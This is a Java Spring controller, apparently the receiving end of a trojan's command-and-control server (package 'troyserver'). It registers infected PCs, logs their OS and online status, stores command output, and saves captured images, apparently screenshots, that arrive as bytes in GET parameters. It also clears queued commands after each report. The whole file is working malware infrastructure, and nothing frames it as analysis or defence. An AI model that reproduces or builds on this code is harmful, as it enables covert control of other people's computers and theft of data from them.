package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.ImageService;
import ch.lebois.troyserver.data.Client;
import ch.lebois.troyserver.data.Message;
import ch.lebois.troyserver.data.ClientRepository;
import ch.lebois.troyserver.data.MessageRepository;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;

@Controller
@RequestMapping(value = "reciver/")
public class ServerReceiverController {

    private ArrayList<Byte> bytes = new ArrayList<>();

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;

    private ImageService imageService;

    public ServerReceiverController(ClientRepository clientRepository, MessageRepository messageRepository,
                                    ImageService imageService) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
        this.imageService = imageService;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getInfo(@PathVariable(value = "client") String clientParam,
                          @RequestParam(name = "type", defaultValue = "") String typeParam,
                          @RequestParam(name = "value", defaultValue = "") String valueParam) {

        Client client = clientRepository.findOne(clientParam);
        if (client == null) {
            client = new Client();
            client.setPcName(clientParam);
            clientRepository.save(client);
        }

        switch (typeParam) {
            case "os":
                client.setOs(valueParam);
                break;
            case "online":
                break;
            case "img":
                for (String s : valueParam.split("_")) {
                    try {
                        bytes.add(Byte.valueOf(s));
                    } catch (NumberFormatException ignored) {
                    }
                }
                client.setCommands("");
                break;
            case "imgend":
                Message imgMessage = new Message();
                imgMessage.setPcNameFk(clientParam);
                imgMessage.setType(typeParam);
                imgMessage.setText("Saved img: " + imageService.getImage(bytes, clientParam));
                messageRepository.save(imgMessage);
                break;
            default:
                client.setCommands("");
                Message defaultMessage = new Message();
                defaultMessage.setPcNameFk(clientParam);
                defaultMessage.setType(typeParam);
                defaultMessage.setText(valueParam);
                messageRepository.save(defaultMessage);
                break;
        }

        client.setLastseen(new SimpleDateFormat("HH:mm dd.MM").format(Calendar.getInstance().getTime()));
        clientRepository.save(client);

        return "receiver";
    }
}
